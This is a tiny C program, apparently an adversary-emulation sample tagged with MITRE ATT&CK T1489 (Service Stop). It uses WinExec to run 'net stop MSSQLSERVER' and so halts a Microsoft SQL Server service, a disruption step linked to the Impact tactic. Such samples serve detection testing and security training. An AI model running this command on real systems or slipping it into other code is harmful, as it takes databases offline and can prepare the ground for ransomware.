// Link      = https://attack.mitre.org/techniques/T1489/
// Technique = Service Stop
// ID        = T1489.000
// Tactics   = Impact

#include <windows.h>

#define RUN(toRun) WinExec(toRun, SW_SHOW);

int main() {
    RUN("C:\\Windows\\System32\\net.exe stop MSSQLSERVER");
    return 0;
}